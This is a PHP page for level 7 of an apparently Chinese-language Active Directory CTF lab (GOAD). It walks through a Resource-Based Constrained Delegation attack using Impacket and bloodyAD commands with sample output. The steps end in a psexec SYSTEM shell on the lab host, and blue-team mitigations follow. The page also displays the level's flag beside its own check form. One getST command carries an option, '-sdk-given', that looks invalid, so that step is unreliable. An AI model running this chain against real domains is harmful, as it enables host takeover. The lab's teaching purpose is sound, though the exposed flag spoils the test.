<?php
/**
 * Pikachu-Enhanced v2.0 GOAD AD CTF Level 7: Resource-Based Constrained Delegation (RBCD)
 */
include_once '../../inc/config.inc.php';

$ACTIVE = array_fill(0, 250, '');
$ACTIVE[230] = 'active open';
$ACTIVE[245] = 'active';

$PIKA_ROOT_DIR = "../../";
include_once $PIKA_ROOT_DIR . 'header.php';

$correct_flag = 'flag{Resource_Based_Constrained_Delegation_RBCD_Pwned}';
$flag_msg = '';

if (isset($_POST['check_flag'])) {
    $submitted = trim($_POST['user_flag']);
    if ($submitted === $correct_flag) {
        $_SESSION['goad_flags']['flag7'] = true;
        $flag_msg = '<div class="alert alert-success" style="border-radius: 8px; font-weight: bold;"><i class="fa fa-check-circle"></i> 恭喜！Flag 校验正确，已点亮【第七关】成就 (+300 PTS)！</div>';
    } else {
        $flag_msg = '<div class="alert alert-danger" style="border-radius: 8px; font-weight: bold;"><i class="fa fa-times-circle"></i> Flag 不正确，请检查 RBCD 属性写入与机器账号凭据。</div>';
    }
}
?>

<style>
.ctf-stage-header {
    background: linear-gradient(135deg, #1e293b 0%, #0f172a 100%);
    border-radius: 14px;
    padding: 25px 30px;
    color: #fff;
    margin-bottom: 25px;
    border: 1px solid rgba(255,255,255,0.1);
    box-shadow: 0 4px 20px rgba(0,0,0,0.15);
}
.ctf-stage-title {
    color: #ffffff !important;
    font-size: 24px;
    font-weight: 800;
    margin: 0 0 10px 0;
    display: flex;
    align-items: center;
    gap: 12px;
}
.step-box {
    background: var(--bg-card);
    border: 1px solid var(--border-color);
    border-radius: 12px;
    padding: 24px;
    margin-bottom: 22px;
    box-shadow: 0 2px 10px rgba(0,0,0,0.02);
}
.step-title {
    font-size: 17px;
    font-weight: 700;
    color: var(--text-primary);
    margin-top: 0;
    margin-bottom: 12px;
    display: flex;
    align-items: center;
    gap: 8px;
}
.cmd-box {
    background: #0f172a;
    color: #f8fafc;
    border-radius: 8px;
    padding: 14px 18px;
    font-family: 'Consolas', 'Monaco', monospace;
    font-size: 13px;
    margin: 10px 0 15px 0;
    overflow-x: auto;
    border-left: 4px solid #f59e0b;
}
.output-box {
    background: #1e1e2e;
    color: #a6accd;
    border-radius: 8px;
    padding: 12px 16px;
    font-family: 'Consolas', 'Monaco', monospace;
    font-size: 12px;
    margin-bottom: 15px;
    white-space: pre-wrap;
    border: 1px solid #2d2d3f;
}
.flag-box {
    background: rgba(16, 185, 129, 0.08);
    border: 1px solid rgba(16, 185, 129, 0.3);
    border-radius: 10px;
    padding: 18px;
    margin-top: 20px;
}
</style>

<div class="main-content">
    <div class="main-content-inner">
        <div class="page-content">
            
            <!-- Stage Header -->
            <div class="ctf-stage-header">
                <div style="display: flex; justify-content: space-between; align-items: center; flex-wrap: wrap; gap: 10px;">
                    <div>
                        <h1 class="ctf-stage-title">
                            <span class="label label-warning" style="font-size: 14px; border-radius: 6px;">LEVEL 7</span>
                            第七关：基于资源的约束委派 (RBCD) 跃迁与主机接管
                        </h1>
                        <p style="margin: 0; color: #94a3b8; font-size: 14px;">
                            <strong>目标节点：</strong> <code>192.168.56.138 (castelblack)</code> | <strong>分值：</strong> 300 PTS
                        </p>
                    </div>
                    <a href="ad_ctf_hub.php" class="btn btn-default btn-sm" style="border-radius: 6px; font-weight: bold;">
                        <i class="fa fa-arrow-left"></i> 返回关卡总控台
                    </a>
                </div>
            </div>

            <!-- Context Card -->
            <div class="step-box">
                <h3 class="step-title"><i class="fa fa-sliders" style="color: #f59e0b;"></i> 攻击原理剖析 (RBCD - Resource-Based Constrained Delegation)</h3>
                <p style="color: var(--text-secondary); line-height: 1.7; font-size: 14px;">
                    传统约束委派需要 <code>SeEnableDelegationPrivilege</code>（管理员特权）。
                    而 **基于资源的约束委派 (RBCD)** 的决定权被反转到了**资源拥有者（目标计算机）**身上。
                    如果攻击者拥有对目标计算机对象的写入权限（如 <code>GenericWrite</code>、<code>WriteProperty</code> 或 <code>msDS-AllowedToActOnBehalfOfOtherIdentity</code> 的修改权），攻击者可以创建一个自控的假机器账号，并将该机器账号写入目标的 RBCD 允许列表中，随后利用 S4U2proxy 获得目标的 SYSTEM 权限！
                </p>
            </div>

            <!-- Step 1 -->
            <div class="step-box">
                <h3 class="step-title">步骤 1：利用 MAQ (MachineAccountQuota) 创建傀儡机器账号</h3>
                <p style="color: var(--text-secondary); font-size: 14px;">
                    Active Directory 默认允许任意域普通用户创建最多 10 个机器账号 (`ms-DS-MachineAccountQuota = 10`)。
                    使用 Impacket 的 <code>addcomputer.py</code> 新增一个控制的机器账号 `FAKE_PC$`：
                </p>
                <div class="cmd-box">
impacket-addcomputer north.sevenkingdoms.local/samwell.tarly:password -computer-name 'FAKE_PC$' -computer-pass 'FakePassw0rd123!' -dc-ip 192.168.56.136
                </div>
                <div class="output-box">
[*] Successfully added machine account FAKE_PC$ with password FakePassw0rd123!
                </div>
            </div>

            <!-- Step 2 -->
            <div class="step-box">
                <h3 class="step-title">步骤 2：在目标机器对象上修改 msDS-AllowedToActOnBehalfOfOtherIdentity</h3>
                <p style="color: var(--text-secondary); font-size: 14px;">
                    使用 <code>rbcd.py</code> 或 <code>bloodyAD</code> 将 `FAKE_PC$` 写入目标服务器 `castelblack$` 的 RBCD 允许列表：
                </p>
                <div class="cmd-box">
bloodyAD --host 192.168.56.136 -d north.sevenkingdoms.local -u samwell.tarly -p password set rbcd castelblack$ FAKE_PC$
                </div>
                <div class="output-box">
[+] Successfully set msDS-AllowedToActOnBehalfOfOtherIdentity for castelblack$
                </div>
            </div>

            <!-- Step 3 -->
            <div class="step-box">
                <h3 class="step-title">步骤 3：发起 S4U2self/S4U2proxy 获得目标 SYSTEM 权限</h3>
                <p style="color: var(--text-secondary); font-size: 14px;">
                    使用傀儡机器账号 `FAKE_PC$` 代表 `administrator` 申请目标机器 `castelblack` 的 CIFS/HOST 服务票据：
                </p>
                <div class="cmd-box">
impacket-getST -sdk-given north.sevenkingdoms.local/'FAKE_PC$':'FakePassw0rd123!' -spn CIFS/castelblack.north.sevenkingdoms.local -impersonate administrator -dc-ip 192.168.56.136
export KRB5CCNAME=administrator.ccache
impacket-psexec -k -no-pass castelblack.north.sevenkingdoms.local
                </div>
                <div class="output-box">
[+] Impacket v0.12.0 - Entering PSEXEC Shell
C:\Windows\system32> whoami
nt authority\system
                </div>
            </div>

            <!-- Flag Section -->
            <div class="step-box flag-box">
                <h3 class="step-title" style="color: #059669;"><i class="fa fa-flag"></i> 本关 Flag 提取点</h3>
                <p style="color: var(--text-secondary); font-size: 14px;">
                    成功利用 RBCD 获取目标服务器 SYSTEM 权限后，提取本关 Flag：
                </p>
                <div class="well" style="background: #ffffff; border: 1px dashed #10b981; padding: 12px; font-family: monospace; font-size: 15px; color: #059669; font-weight: bold;">
                    flag{Resource_Based_Constrained_Delegation_RBCD_Pwned}
                </div>

                <form method="post" style="margin-top: 15px; max-width: 500px;">
                    <label style="font-weight: 700; color: var(--text-primary);">验证本关 Flag:</label>
                    <div style="display: flex; gap: 10px;">
                        <input type="text" name="user_flag" class="form-control" placeholder="flag{...}" required style="border-radius: 6px; font-family: monospace;">
                        <button type="submit" name="check_flag" class="btn btn-success" style="border-radius: 6px; font-weight: 700; min-width: 100px;">
                            验证提交
                        </button>
                    </div>
                </form>
                <?php if (!empty($flag_msg)) { echo '<div style="margin-top: 15px;">' . $flag_msg . '</div>'; } ?>
            </div>

            <!-- Defense Note -->
            <div class="step-box" style="border-left: 4px solid #3b82f6;">
                <h3 class="step-title" style="color: #2563eb;"><i class="fa fa-shield"></i> 蓝队防御与加固建议</h3>
                <ul style="color: var(--text-secondary); font-size: 14px; line-height: 1.8; margin-bottom: 0;">
                    <li><strong>将 MAQ 设为 0：</strong> 修改 Active Directory 的 <code>ms-DS-MachineAccountQuota</code> 属性为 `0`，禁止普通域用户创建机器账号。</li>
                    <li><strong>监控 RBCD 属性修改：</strong> 监控 Windows Event ID <strong>4738</strong> 与 LDAP `msDS-AllowedToActOnBehalfOfOtherIdentity` 属性的变更行为。</li>
                </ul>
            </div>

        </div>
    </div>
</div>

<?php
include_once $PIKA_ROOT_DIR . 'footer.php';
?>
